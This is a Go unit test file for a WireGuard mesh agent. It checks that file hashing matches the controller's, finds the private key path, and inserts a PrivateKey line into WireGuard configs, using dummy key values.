func TestHashFilesMatchesController(t *testing.T) {
	// The controller computes sha256 over "name\0content\0" in sorted name order.
	got := hashFiles(map[string]string{"wireguard.conf": "w", "nftables.conf": "n", "sysctl.conf": "s"})
	// Computed with the controller's implementation (src/core/generate/index.ts hashFiles).
	want := "b7f0618d0fa3aeb3718519d0dd9f9460d23d70354487eb614825dc81b05e07ba"
	if got != want {
		t.Fatalf("hash mismatch with controller: got %s want %s", got, want)
	}
	if hashFiles(map[string]string{"a": "1"}) == hashFiles(map[string]string{"a": "2"}) {
		t.Fatal("content must affect the hash")
	}
}

func TestPrivateKeyPathAndInjection(t *testing.T) {
	if p := privateKeyPathOf(sampleConf); p != "/etc/opnmesh/private.key" {
		t.Fatalf("key path: %q", p)
	}
	if p := privateKeyPathOf("[Interface]\nListenPort = 1\n"); p != "" {
		t.Fatalf("expected empty key path, got %q", p)
	}
	stripped := "[Interface]\nListenPort = 51820\n\n[Peer]\nPublicKey = x\n"
	got := injectPrivateKey(stripped, "KEY=\n")
	want := "[Interface]\nPrivateKey = KEY=\nListenPort = 51820\n\n[Peer]\nPublicKey = x\n"
	if got != want {
		t.Fatalf("inject:\n%s", got)
	}
	if injectPrivateKey(stripped, "") != stripped {
		t.Fatal("empty key must not change the config")
	}
	if got := injectPrivateKey("[Peer]\nPublicKey = x\n", "K"); !strings.HasPrefix(got, "[Interface]\nPrivateKey = K\n") {
		t.Fatalf("missing interface section not handled: %q", got)
	}
}

